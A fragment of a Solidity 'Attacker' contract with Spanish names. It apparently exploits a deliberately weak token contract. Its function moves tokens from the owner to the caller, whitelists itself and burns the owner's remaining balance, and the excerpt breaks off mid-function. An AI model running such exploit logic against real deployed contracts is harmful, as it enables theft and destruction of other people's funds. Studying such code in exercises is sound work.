...
contract Attacker {
    ...
    function ejecutarAtaque() public {
        // tokenTruco ...
        uint256 montoInicial = tokenTruco.balances(tokenTruco.owner());
        uint256 monto = tokenTruco.montoAleatorio();
        tokenTruco.transferFrom(tokenTruco.owner(), msg.sender, monto);
        tokenTruco.addToWhitelist();
        tokenTruco.burn(tokenTruco.owner(), montoInicial - monto);
